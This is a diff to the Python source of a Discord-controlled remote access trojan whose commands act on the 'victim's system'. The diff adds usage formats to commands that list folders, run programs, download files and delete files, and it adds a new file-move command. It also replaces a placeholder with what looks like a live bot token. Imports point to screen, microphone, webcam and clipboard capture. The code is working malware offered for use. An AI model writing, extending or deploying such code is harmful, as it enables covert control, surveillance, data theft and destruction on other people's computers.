@@ -1,32 +1,32 @@
-import discord
-from discord.ext import commands
 from PIL import ImageGrab, ImageDraw
-import io
-import requests
-import pyaudio
-import wave
-import subprocess
-import asyncio
+from discord.ext import commands
 from threading import Thread
-import pyautogui
-import time
-import ctypes
-import aiohttp
-import cv2
-import psutil
+import subprocess
 import webbrowser
-import os
-import shutil
+import pyautogui
 import pyperclip
 import tempfile
-import shelve
-import sys
-import uuid
-import hashlib
+import requests
 import tempfile
+import aiohttp
+import asyncio
+import discord
+import hashlib
+import pyaudio
 import zipfile
+import ctypes
+import psutil
+import shelve
+import shutil
+import time
+import uuid
+import wave
+import cv2
+import sys
+import io
+import os
 
-TOKEN = "BOT-TOKEN-GOES-HERE"
+TOKEN = "MTIzNTY2NTc2Mzc2NDAxNTIyNQ.GHY3rF.sjaAOYkTTvLFaFucNdm3QDS2Uu5_ui-S2PAtt0"
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -71,10 +71,10 @@ async def on_guild_join(guild):
         config_db[str(guild.id)] = {'allowed_roles': [], 'allowed_channels': []}
         for channel in guild.channels:
             if isinstance(channel, discord.TextChannel):
-                await channel.send(f"Bot has joined! Please run `$config` in a channel named `_jf_{ FUCK}` to get started.\nThe channel will be used to bypass role and channel allowlists, allowing for initial config.")
+                await channel.send(f"Bot has joined! Please run `$config` in a channel named `_jf_{FUCK}` to get started.\nThe channel will be used to bypass role and channel allowlists, allowing for initial config.")
 
 
-@bot.command(help=f"Configure allowed roles and channels for running commands, to run a command you must have the a allowed role and be in an allowed channel, running in _jf_{FUCK} bypasses both che cks")
+@bot.command(help=f"Configure allowed roles and channels for running commands, to run a command you must have the a allowed role and be in an allowed channel, running in _jf_{FUCK} bypasses both checks")
 async def config(ctx, action: str = "", item: str = "", target: str = ""):
     try:
         os.makedirs(config_path, exist_ok=True)
@@ -386,7 +386,7 @@ async def upload(ctx, folder: str = None):
     else:
         await ctx.reply("Error: No file attached to the message.")
         
-@bot.command(help="Lists contents of a folder on victim's system")
+@bot.command(help="Lists contents of a folder on victim's system, format $ls {folder (D:/folder/)}")
 async def ls(ctx, path: str = None):
     if not path:
         await ctx.reply("Error: No path provided. Please specify a directory path to list.")
@@ -414,7 +414,7 @@ async def ls(ctx, path: str = None):
 
     await ctx.reply(f"{response}")
 
-@bot.command(help="Runs a specified program on victim's system")
+@bot.command(help="Runs a specified program on victim's system, format $run {file (D:/file.exe)}")
 async def run(ctx, file_path: str = None):
     if not file_path:
         await ctx.reply("Error: No file path provided. Please specify the file path to run.")
@@ -428,7 +428,7 @@ async def run(ctx, file_path: str = None):
     except Exception as e:
         await ctx.reply(f"Error: Could not execute the file. {str(e)}")    
 
-@bot.command(help="Zips and downloads a file from victim's system")
+@bot.command(help="Zips and downloads a file from victim's system, format $download {file (D:/file.png)}")
 async def download(ctx, file_path: str = None):
     if not file_path:
         await ctx.reply("Error: No file path provided. Please specify the file path to download.")
@@ -453,7 +453,7 @@ async def download(ctx, file_path: str = None):
     except Exception as e:
         await ctx.reply(f"Error: Could not compress and send the file. {str(e)}")
     
-@bot.command(help="Deletes a folder or file from the victim's system")
+@bot.command(help="Deletes a folder or file from the victim's system, format $delete {file (D:/file.png)}")
 async def delete(ctx, path: str = None):
     if not path:
         await ctx.reply("Error: No path provided. Please specify a file or folder path to delete.")
@@ -466,6 +466,24 @@ async def delete(ctx, path: str = None):
         await ctx.reply(f"Folder '{path}' and all its contents have been deleted.")
     else:
         await ctx.reply(f"The path '{path}' does not exist.")
+        
+@bot.command(help="Moves a file from one location to another on victim's system, format $move {file (D:/file.png)} {folder (D:/destination/)}")
+async def move(ctx, source: str = None, destination: str = None):
+    if not source or not destination:
+        await ctx.reply("Error: Please provide both source and destination paths.")
+        return
+    if not os.path.exists(source):
+        await ctx.reply(f"Error: The source path '{source}' does not exist.")
+        return
+    destination_dir = os.path.dirname(destination)
+    if not os.path.exists(destination_dir):
+        await ctx.reply(f"Error: The destination directory '{destination_dir}' does not exist.")
+        return
+    try:
+        shutil.move(source, destination)
+        await ctx.reply(f"'{source}' has been moved to '{destination}'.")
+    except Exception as e:
+        await ctx.reply(f"Error: Could not move '{source}' to '{destination}'. {str(e)}")
 
 @bot.command(help="Freezes the cursor on the victim's system.")
 async def freezecursor(ctx):
